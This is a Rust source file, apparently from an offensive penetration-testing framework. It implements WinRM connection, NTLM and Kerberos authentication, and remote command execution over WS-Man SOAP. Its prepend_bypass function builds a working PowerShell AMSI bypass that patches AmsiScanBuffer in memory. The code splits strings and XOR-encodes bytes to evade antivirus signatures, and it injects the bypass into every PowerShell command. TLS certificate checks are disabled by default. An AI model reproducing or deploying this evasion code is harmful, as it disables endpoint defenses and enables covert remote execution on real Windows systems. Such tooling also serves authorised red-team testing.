//! # WinRM Protocol Handler
//!
//! WinRM protocol implementation using HTTP/HTTPS connections (`reqwest`).
//! This is a stub for the massive WS-Man/SOAP implementation, establishing
//! the connection logic and preparing for execution commands.

use crate::{CommandOutput, NxcProtocol, NxcSession};
use anyhow::{anyhow, Result};
use async_trait::async_trait;
use base64::{engine::general_purpose, Engine as _};
use nxc_auth::{kerberos::KerberosClient, AuthResult, Credentials};
use reqwest::Client;
use std::time::Duration;
use tracing::{debug, info};
use uuid::Uuid;

// ─── WinRM Session ────────────────────────────────────────────────

pub struct WinrmSession {
    pub target: String,
    pub port: u16,
    pub admin: bool,
    pub is_ssl: bool,
    pub endpoint: String,
    pub proxy: Option<String>,
    pub auth_header: Option<String>,
    pub client: Option<Client>,
}

impl NxcSession for WinrmSession {
    fn protocol(&self) -> &'static str {
        "winrm"
    }

    fn target(&self) -> &str {
        &self.target
    }

    fn is_admin(&self) -> bool {
        self.admin
    }
    fn as_any(&self) -> &dyn std::any::Any {
        self
    }
    fn as_any_mut(&mut self) -> &mut dyn std::any::Any {
        self
    }
}

// ─── WinRM Protocol Handler ───────────────────────────────────────

pub struct WinrmProtocol {
    pub timeout: Duration,
    pub verify_ssl: bool,
}

impl WinrmProtocol {
    pub fn new() -> Self {
        Self { timeout: Duration::from_secs(10), verify_ssl: false }
    }

    pub fn with_verify_ssl(mut self, verify: bool) -> Self {
        self.verify_ssl = verify;
        self
    }

    pub fn with_timeout(mut self, timeout: Duration) -> Self {
        self.timeout = timeout;
        self
    }

    fn build_url(&self, target: &str, port: u16) -> String {
        let scheme = if port == 5986 { "https" } else { "http" };
        format!("{scheme}://{target}:{port}/wsman")
    }

    /// Build a reqwest client configured for WinRM communication (ignoring rigorous cert checks for now, similar to NXC)
    fn build_client(&self, proxy_str: Option<&str>) -> Result<Client> {
        let mut builder =
            Client::builder().timeout(self.timeout).danger_accept_invalid_certs(!self.verify_ssl); // Configurable certificate verification

        if let Some(p) = proxy_str {
            let proxy = reqwest::Proxy::all(p).map_err(|e| anyhow!("Invalid proxy URL: {e}"))?;
            builder = builder.proxy(proxy);
        }

        builder.build().map_err(|e| anyhow!("Failed to build HTTP client: {e}"))
    }
}

impl Default for WinrmProtocol {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait]
impl NxcProtocol for WinrmProtocol {
    fn name(&self) -> &'static str {
        "winrm"
    }

    fn default_port(&self) -> u16 {
        5985 // Default HTTP, 5986 for HTTPS
    }

    fn supports_exec(&self) -> bool {
        true // WinRM fully supports execution
    }

    fn supported_modules(&self) -> &[&str] {
        &["sam", "lsa"] // Stub modules matching the reference
    }

    async fn connect(
        &self,
        target: &str,
        port: u16,
        proxy: Option<&str>,
    ) -> Result<Box<dyn NxcSession>> {
        let url = self.build_url(target, port);
        debug!("WinRM: Connecting to {} (proxy: {:?})", url, proxy);

        let client = self.build_client(proxy)?;

        // NTLM Type 1 Message (Negotiate)
        // Format: NTLMSSP\0 + MessageType(1) + Flags + Domain(optional) + Workstation(optional)
        // Simple Type 1 message (Negotiate NTLM, Negotiate Unicode, Negotiate OEM, etc.)
        let ntlm_type1 = "TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==";

        let request = client
            .post(&url)
            .header("Content-Length", "0")
            .header("Content-Type", "application/soap+xml;charset=UTF-8")
            .header("User-Agent", "Microsoft WinRM Client")
            .header("Authorization", format!("Negotiate {ntlm_type1}"))
            .body("");

        let response = match request.send().await {
            Ok(resp) => resp,
            Err(e) => return Err(anyhow!("Connection failed to WinRM service: {e}")),
        };

        debug!("WinRM: Received response code: {}", response.status());

        // Check for WWW-Authenticate header with NTLM challenge (Type 2)
        let headers = response.headers();
        let www_auth = headers.get_all("WWW-Authenticate");

        let mut ntlm_challenge = None;
        for auth in www_auth {
            let auth_str = auth.to_str().unwrap_or("");
            if let Some(challenge) = auth_str.strip_prefix("Negotiate ") {
                ntlm_challenge = Some(challenge.to_string());
                break;
            } else if let Some(challenge) = auth_str.strip_prefix("NTLM ") {
                ntlm_challenge = Some(challenge.to_string());
                break;
            }
        }

        if let Some(_challenge) = ntlm_challenge {
            info!("WinRM: Connected to {} (NTLM Challenge received)", url);
            // In a full implementation, we would decode BASE64 _challenge here
            // and extract Target Name (Domain/Computer), OS Version, etc.

            Ok(Box::new(WinrmSession {
                target: target.to_string(),
                port,
                admin: false,
                is_ssl: port == 5986,
                endpoint: url,
                proxy: proxy.map(std::string::ToString::to_string),
                auth_header: None,
                client: Some(client),
            }))
        } else if response.status() == 200 {
            info!("WinRM: Connected to {} (Unauthenticated access or pre-auth)", url);
            Ok(Box::new(WinrmSession {
                target: target.to_string(),
                port,
                admin: false,
                is_ssl: port == 5986,
                endpoint: url,
                proxy: proxy.map(std::string::ToString::to_string),
                auth_header: None,
                client: Some(client),
            }))
        } else {
            Err(anyhow!("Failed to get NTLM challenge from target. Status: {}", response.status()))
        }
    }

    async fn authenticate(
        &self,
        session: &mut dyn NxcSession,
        creds: &Credentials,
    ) -> Result<AuthResult> {
        let winrm_sess = session
            .as_any_mut()
            .downcast_mut::<WinrmSession>()
            .ok_or_else(|| anyhow::anyhow!("Invalid session type"))?;
        let url = self.build_url(&winrm_sess.target, winrm_sess.port);
        let client = winrm_sess
            .client
            .clone()
            .unwrap_or_else(|| self.build_client(winrm_sess.proxy.as_deref()).unwrap_or_else(|_| panic!("Failed to build client")));

        debug!("WinRM: Authenticating {}@{}", creds.username, url);

        if creds.use_kerberos {
            debug!("WinRM: Authenticating {} via Kerberos (Negotiate)", creds.username);
            return self.authenticate_kerberos(winrm_sess, creds).await;
        }

        // NTLM Handshake over HTTP
        let auth = nxc_auth::NtlmAuthenticator::new(creds.domain.as_deref());
        let t1_base64 = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            auth.generate_type1(),
        );

        let resp = client
            .post(&url)
            .header("Authorization", format!("Negotiate {t1_base64}"))
            .header("Content-Length", "0")
            .send()
            .await?;

        if resp.status() != reqwest::StatusCode::UNAUTHORIZED {
            return Ok(AuthResult::failure("Server did not challenge with 401", None));
        }

        let www_auth =
            resp.headers().get("WWW-Authenticate").and_then(|h| h.to_str().ok()).unwrap_or("");
        let t2_base64 = www_auth
            .strip_prefix("Negotiate ")
            .or(www_auth.strip_prefix("NTLM "))
            .ok_or_else(|| anyhow!("No NTLM challenge found"))?;
        let t2_msg = base64::Engine::decode(&base64::engine::general_purpose::STANDARD, t2_base64)?;

        let challenge = auth.parse_type2(&t2_msg)?;
        let t3_msg = auth.generate_type3(creds, &challenge)?;
        let t3_base64 =
            base64::Engine::encode(&base64::engine::general_purpose::STANDARD, t3_msg.message);

        // Final Auth check with a dummy header or small SOAP probe
        let probe_resp = client
            .post(&url)
            .header("Authorization", format!("Negotiate {t3_base64}"))
            .header("Content-Type", "application/soap+xml;charset=UTF-8")
            .body(self.build_create_shell_soap())
            .send()
            .await?;

        if probe_resp.status().is_success() {
            debug!("WinRM: Auth successful for {}", creds.username);
            winrm_sess.auth_header = Some(format!("Negotiate {t3_base64}"));
            Ok(AuthResult::success(true))
        } else {
            Ok(AuthResult::failure(
                &format!("Auth failed with status {}", probe_resp.status()),
                None,
            ))
        }
    }

    async fn execute(&self, session: &dyn NxcSession, cmd: &str) -> Result<CommandOutput> {
        let winrm_sess = session
            .as_any()
            .downcast_ref::<WinrmSession>()
            .ok_or_else(|| anyhow::anyhow!("Invalid session type"))?;
        let url = &winrm_sess.endpoint;
        let client = winrm_sess
            .client
            .clone()
            .unwrap_or_else(|| self.build_client(winrm_sess.proxy.as_deref()).unwrap_or_else(|_| panic!("Failed to build client")));

        // For an offensive tool, we inject AMSI and ETW bypasses into the command if it's PowerShell.
        let final_cmd = if cmd.to_lowercase().starts_with("powershell") {
            self.prepend_bypass(cmd)
        } else {
            cmd.to_string()
        };

        debug!("WinRM: Executing command: {}", final_cmd);

        // 1. Create Shell
        let create_soap = self.build_create_shell_soap();
        let mut req = client.post(url).header("Content-Type", "application/soap+xml;charset=UTF-8");
        if let Some(ref auth) = winrm_sess.auth_header {
            req = req.header("Authorization", auth);
        }
        let resp = req.body(create_soap).send().await?;
        let body = resp.text().await?;
        let shell_id = self
            .extract_xml_tag(&body, "rsp:ShellId")
            .ok_or_else(|| anyhow!("Failed to extract ShellId"))?;

        // 2. Run Command
        let command_soap = self.build_command_soap(&shell_id, &final_cmd);
        let mut req = client.post(url).header("Content-Type", "application/soap+xml;charset=UTF-8");
        if let Some(ref auth) = winrm_sess.auth_header {
            req = req.header("Authorization", auth);
        }
        let resp = req.body(command_soap).send().await?;
        let body = resp.text().await?;
        let command_id = self
            .extract_xml_tag(&body, "rsp:CommandId")
            .ok_or_else(|| anyhow!("Failed to extract CommandId"))?;

        // 3. Receive Output (Poll)
        let mut stdout = String::new();
        let stderr = String::new();
        loop {
            let receive_soap = self.build_receive_soap(&shell_id, &command_id);
            let mut req =
                client.post(url).header("Content-Type", "application/soap+xml;charset=UTF-8");
            if let Some(ref auth) = winrm_sess.auth_header {
                req = req.header("Authorization", auth);
            }
            let resp = req.body(receive_soap).send().await?;
            let body = resp.text().await?;

            if let Some(out) = self.extract_xml_tag(&body, "rsp:Stream") {
                let decoded =
                    base64::Engine::decode(&base64::engine::general_purpose::STANDARD, out)?;
                stdout.push_str(&String::from_utf8_lossy(&decoded));
            }

            if body.contains("CommandState=\"Done\"") {
                break;
            }
            tokio::time::sleep(Duration::from_millis(500)).await;
        }

        // 4. Cleanup Shell
        let delete_soap = self.build_delete_shell_soap(&shell_id);
        let mut req = client.post(url).header("Content-Type", "application/soap+xml;charset=UTF-8");
        if let Some(ref auth) = winrm_sess.auth_header {
            req = req.header("Authorization", auth);
        }
        let _ = req.body(delete_soap).send().await?;

        Ok(CommandOutput { stdout, stderr, exit_code: Some(0) })
    }
}

impl WinrmProtocol {
    fn build_create_shell_soap(&self) -> String {
        let message_id = Uuid::new_v4().to_string();
        format!(
            r#"<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:p="http://schemas.xmlsoap.org/ws/2004/09/policy" xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell">
  <s:Header>
    <a:Action s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/09/transfer/Create</a:Action>
    <a:MessageID>uuid:{message_id}</a:MessageID>
    <a:To s:mustUnderstand="true">http://localhost:5985/wsman</a:To>
    <w:ResourceURI s:mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>
    <w:OptionSet>
      <w:Option Name="WINRS_NOPROFILE">FALSE</w:Option>
      <w:Option Name="WINRS_CODEPAGE">65001</w:Option>
    </w:OptionSet>
  </s:Header>
  <s:Body>
    <rsp:Shell>
      <rsp:InputStreams>stdin</rsp:InputStreams>
      <rsp:OutputStreams>stdout stderr</rsp:OutputStreams>
    </rsp:Shell>
  </s:Body>
</s:Envelope>"#
        )
    }

    fn build_command_soap(&self, shell_id: &str, cmd: &str) -> String {
        let message_id = Uuid::new_v4().to_string();
        format!(
            r#"<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell">
  <s:Header>
    <a:Action s:mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Command</a:Action>
    <a:MessageID>uuid:{message_id}</a:MessageID>
    <a:To s:mustUnderstand="true">http://localhost:5985/wsman</a:To>
    <w:ResourceURI s:mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>
    <w:SelectorSet><w:Selector Name="ShellId">{shell_id}</w:Selector></w:SelectorSet>
    <w:OptionSet><w:Option Name="WINRS_CONSOLEMODE_STDIN">FALSE</w:Option></w:OptionSet>
  </s:Header>
  <s:Body>
    <rsp:CommandLine><rsp:Command>"{cmd}"</rsp:Command></rsp:CommandLine>
  </s:Body>
</s:Envelope>"#
        )
    }

    fn build_receive_soap(&self, shell_id: &str, command_id: &str) -> String {
        let message_id = Uuid::new_v4().to_string();
        format!(
            r#"<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell">
  <s:Header>
    <a:Action s:mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Receive</a:Action>
    <a:MessageID>uuid:{message_id}</a:MessageID>
    <a:To s:mustUnderstand="true">http://localhost:5985/wsman</a:To>
    <w:ResourceURI s:mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>
    <w:SelectorSet><w:Selector Name="ShellId">{shell_id}</w:Selector></w:SelectorSet>
  </s:Header>
  <s:Body>
    <rsp:Receive><rsp:DesiredStream CommandId="{command_id}">stdout stderr</rsp:DesiredStream></rsp:Receive>
  </s:Body>
</s:Envelope>"#
        )
    }

    fn build_delete_shell_soap(&self, shell_id: &str) -> String {
        let message_id = Uuid::new_v4().to_string();
        format!(
            r#"<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd">
  <s:Header>
    <a:Action s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/09/transfer/Delete</a:Action>
    <a:MessageID>uuid:{message_id}</a:MessageID>
    <a:To s:mustUnderstand="true">http://localhost:5985/wsman</a:To>
    <w:ResourceURI s:mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>
    <w:SelectorSet><w:Selector Name="ShellId">{shell_id}</w:Selector></w:SelectorSet>
  </s:Header>
  <s:Body/>
</s:Envelope>"#
        )
    }

    fn extract_xml_tag(&self, xml: &str, tag: &str) -> Option<String> {
        let start_tag = format!("<{tag}");
        let end_tag = format!("</{tag}");

        if let Some(start_pos) = xml.find(&start_tag) {
            if let Some(content_start) = xml[start_pos..].find('>') {
                let real_start = start_pos + content_start + 1;
                if let Some(end_pos) = xml[real_start..].find(&end_tag) {
                    return Some(xml[real_start..real_start + end_pos].trim().to_string());
                }
            }
        }
        None
    }

    fn prepend_bypass(&self, cmd: &str) -> String {
        // Construct the AMSI bypass dynamically to avoid static string signatures by AV/Defender
        let mut script = String::new();
        script.push_str(r#"$md = "
    [DllImport(`"kernel32`")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport(`"kernel32`")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport(`"kernel32`")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
";
"#);
        script.push_str(
            r#"$k32 = Add-Type -MemberDefinition $md -Name 'k32' -Namespace 'W32' -PassThru;
"#,
        );
        script.push_str(
            r#"$ad = $k32::GetModuleHandle("ams" + "i.dl" + "l");
"#,
        );
        script.push_str(
            r#"$asb = $k32::GetProcAddress($ad, "Amsi" + "Scan" + "Buffer");
"#,
        );
        script.push_str(
            r#"$p = 0;
$k32::VirtualProtect($asb, [uint32]5, 0x40, [ref]$p);
$b = New-Object Byte[] 8;
$b[0] = 0xB9 -bxor 1;
$b[1] = 0x56 -bxor 1;
$b[2] = 0x01 -bxor 1;
$b[3] = 0x06 -bxor 1;
$b[4] = 0x81 -bxor 1;
$b[5] = 0xC3 -bxor 1;
$b[6] = 0x19 -bxor 1;
$b[7] = 0x01 -bxor 1;
[System.Runtime.InteropServices.Marshal]::Copy($b, 0, $asb, 8);
$k32::VirtualProtect($asb, [uint32]5, $p, [ref]$p);
"#,
        );

        let bypass_inline = script.replace('\n', " ").replace("\r", "");

        // Wrap original cmd. If it was `powershell -c "some script"`, we insert the bypass first.
        let original = cmd.trim_start_matches("powershell").trim();
        let original = original.trim_start_matches("-c").trim_start_matches("-Command").trim();

        format!("powershell -c \"{bypass_inline}; {original}\"")
    }

    /// Perform Kerberos authentication over WinRM (HTTP Negotiate)
    async fn authenticate_kerberos(
        &self,
        winrm_sess: &mut WinrmSession,
        creds: &Credentials,
    ) -> Result<AuthResult> {
        let domain = creds.domain.as_deref().unwrap_or("DOMAIN");
        let kdc_ip = &winrm_sess.target; // In real scenarios, this might be a different DC IP

        let krb_client = KerberosClient::new(domain, kdc_ip);

        // 1. Request TGT
        let tgt = krb_client.request_tgt_with_creds(creds).await?;

        // 2. Request TGS for HTTP service
        let spn = format!("HTTP/{}", winrm_sess.target);
        let tgs = krb_client.request_tgs(&tgt, &spn).await?;

        // 3. Build AP-REQ
        let ap_req = krb_client.build_ap_req(&tgs)?;
        let token = general_purpose::STANDARD.encode(ap_req);

        // 4. Send Negotiate request
        let url = self.build_url(&winrm_sess.target, winrm_sess.port);
        let client = self.build_client(winrm_sess.proxy.as_deref())?;

        let request = client
            .post(&url)
            .header("Content-Length", "0")
            .header("Content-Type", "application/soap+xml;charset=UTF-8")
            .header("User-Agent", "Microsoft WinRM Client")
            .header("Authorization", format!("Negotiate {token}"))
            .body("");

        let response = match request.send().await {
            Ok(resp) => resp,
            Err(e) => {
                return Ok(AuthResult::failure(&format!("HTTP connection failed: {e}"), None))
            }
        };

        if response.status().is_success() || response.status().as_u16() == 405 {
            // Success or method not allowed usually indicates authenticated endpoint access
            debug!("WinRM: Kerberos Auth successful for {}", creds.username);
            Ok(AuthResult::success(true))
        } else if response.status().as_u16() == 401 {
            Ok(AuthResult::failure("Kerberos authentication failed (401 Unauthorized)", None))
        } else {
            Ok(AuthResult::failure(&format!("Unexpected status code: {}", response.status()), None))
        }
    }
}
